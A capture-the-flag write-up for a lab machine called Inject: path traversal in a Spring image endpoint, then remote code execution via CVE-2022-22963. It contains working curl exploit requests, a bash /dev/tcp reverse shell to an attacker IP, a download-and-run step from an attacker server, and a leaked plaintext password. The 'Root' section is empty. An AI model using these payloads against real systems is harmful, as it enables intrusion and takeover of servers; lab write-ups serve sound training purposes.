# Inject

### Info Gathering
First thing let's scan for the open ports:
```
[vecio@vecio Notes]$ nmap 10.10.11.204
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 14:33 CET
Nmap scan report for inject.htb (10.10.11.204)
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
```
We now know that the server has 2 services open: SSH service on the port 22 and an HTTP server on the port 8080.
First thing we can check the web server, so we add the IP address to the `/etc/hosts` file:
```
# Static table lookup for hostnames.
# See hosts(5) for details.
127.0.0.1	localhost
::1		localhost
127.0.1.1	vecio.localdomain	vecio

10.10.11.204	inject.htb
```
We can now access the web server on the browser using its domain or the IP address followed by the port 8080.

Looking around we see that the only functionality of the web page is to upload images to the server and view them.
The main activity occurs in the POST request made to the `/upload` route to upload the image to the server and in the GET request made to the `/show_image?img=image.png` route to view it.
Trying to find a vulnerability in the upload part is a rabbit hole.
We can use BurpSuite to test the request made to `/show_image?img=image.png`, we find that the server actually takes the path from the http parameter `img` to choose what image to display.
Trying to make a get request to `/show_image?img=/` we get a list of files which are all the images files uploaded to the server.

![image](https://cdn.discordapp.com/attachments/717442721303887963/1089186119503069265/screenshot.png)

We can use this to see the system directories and files, we can do some enumeration about the web server: how it's made, what technologies does it use and the source code of the web server.
We can see that it is a Java WebServer, we can find the main source code at the path `/show_image?img=../java/com/example/WebApp/user/UserController.java` and we can analyze the method `getImage()` that manages the `/show_image` route and understand why this vulnerability is possible:

```java
// ...
private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/";
// ...

@RequestMapping(value = "/show_image", method = RequestMethod.GET)
public ResponseEntity getImage(@RequestParam("img") String name) {
    String fileName = UPLOADED_FOLDER + name;
    Path path = Paths.get(fileName);
    Resource resource = null;

    try {
        resource = new UrlResource(path.toUri());
    } catch (MalformedURLException e){
        e.printStackTrace();
    }

    return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
}

//...
``` 
We can see that the HTTP `img` parameter is saved in the method's `name` parameter, which is then combined to the `UPLOADED_FOLDER` class member in the `fileName` variable, so if we set the `img` parameter to `../`, the `fileName` variable would be:
```java
String fileName = "/var/www/WebApp/src/main/uploads/../";
```
Which is actually the whole `uploads` directory. The string is then converted into a `Path` object, which is then formatted into a `UrlResource` and returned as response.

Going on with the enumeration we can find the Java configuration file `pom.xml` at the path `/show_image?img=../../../pom.xml`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```
From this configuration file we can find some useful information:
    * The framework used: `SpringFramework` version `2.6.5`
    * Java version: `11`
    * The list of dependencies used:
        * `javax.activation` version `1.2.0`
        * `spring-boot-starter-thymeleaf`
        * `spring-boot-starter-web`
        * `spring-boot-devtools`
        * `spring-cloud-function-web` version `3.2.2`
        * `bootstrap` version `5.1.3`
        * `webjars-locator-core`

Now Google is your friend, start searching for known vulnerabilities we can exploit.

### Exploiting
We find [CVE-2022-22963: Remote Code Execution in Spring Cloud Function by malicius Spring Expression](https://spring.io/security/cve-2022-22963).

"In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources".

Let's understand how the vulnerability works ([source](https://sysdig.com/blog/cve-2022-22963-spring-cloud/#:~:text=The%20vulnerability%20CVE%2D2022%2D22963,also%20allows%20remote%20code%20execution.)):

The Spring Cloud Function framework allows developers to write cloud-agnostic functions using Spring features. These functions can be stand-alone classes and one can easily deploy them on any cloud platform yo build a serverless framework.
The major advantage of Spring Cloud Function is that it provides all the features of Spring Boot-like autoconfiguration and dependency injection.
The issue is that it permits using HTTP request header `spring.cloud.function.routing-expression` parameter and SpEL expression to be injected and executed through `StandardEvaluationContext`.

As we can see from the [patch](https://github.com/spring-cloud/spring-cloud-function/commit/03db9baee65ba0ddcd2c2cbc1f4ebc3646a6872e#diff-01d5affef57305a3034bfb48185f34ae3d21f15e7f389851ac67035f7bd0dc7aR222), a new flag `isViaHeader` was added to perform the validation before parsing the header content.

![image](https://sysdig.com/wp-content/uploads/image4-3-1170x306.png)

We can see how it worked before where the value was used prior to any validation.

So, we can make an HTTP request to execute commands on the machine:
```
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/test")' --data-raw 'data' -v
```
We can test the vulnerability by creating a file `test` in the `/tmp` directory and check if it gets created using BurpSuite and the `/show_image` vulnerability.

# Reverse Shell
Now that we discovered an RCE, we can download and execute a reverse shell on the machine.
We can use a bash reverse shell:
```bash
bash -i >& /dev/tcp/10.10.16.79/1234 0>&1
```

First thing let's start the Python Web Server service in order to provide a place where to download the shell script:
```
python -m http.server
```
then we can use the Cloud Function exploit to download the file:
```
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl -o /tmp/bash_reverse http://10.10.16.79:8000/Payloads/bash_reverse_shell")' --data-raw 'data' -v
```
Use netcat to start listening on port `1234`:
```
nc -lvnp 1234
```
and execute the script on the machine:
```
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/bash_reverse")' --data-raw 'data' -v
```
We now got a reverse shell to the machine.

# User
Getting the user flag is quite easy, we can see that we are logged in as user `frank`.
Looking around in the `/home` directory, we can find the user flag in the `/home/phil` directory, but we don't have permission to read that file.
Looking in the `/home/frank` directory using `ls -la` we notice a strange directory `.m2`, inside of which there's the file `settings.xml`, we can print the content of the file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```
We notice a credential leak of the user phil: `phil:DocPhillovestoInject123`.
We can now swith user: `su phil` and get the flag in the `/home/phil/user.txt` file.

# Root
